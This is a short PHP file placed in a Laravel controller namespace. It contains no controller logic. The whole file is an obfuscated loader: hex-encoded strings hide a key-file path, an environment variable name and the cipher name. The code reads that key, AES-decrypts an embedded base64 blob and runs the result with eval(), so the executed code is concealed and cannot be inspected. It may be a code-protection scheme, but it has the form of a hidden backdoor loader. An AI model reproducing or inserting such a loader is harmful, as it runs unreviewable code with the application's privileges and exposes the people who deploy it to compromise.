<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('GD0C4OcXCVoen8k11GwC/A==');

$c=base64_decode(

'vRVdgjqmxPU17Qc5g9SC9m5NsU8eSj0kf4dhbl782/0ZkOIRgKflWaVYjQ++k9NQno6nC7nX6tIt' .
'yN1tzxsjaKMkExk75lXSggwrxWxqlZYHlGfORqSnkoWAeb61mz5KI0BUx3oPD+sFzNndD2UAKET7' .
'FuUFFdnNFnVSeSW+MGW0Yu4oQxW0xE/aPChrftjp0NtgXR83a8wdz3AK5w7Re1HJauafNidwYJnO' .
'CWZ8HOyI1Lr+lcBnDjU/CAiXrESe'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

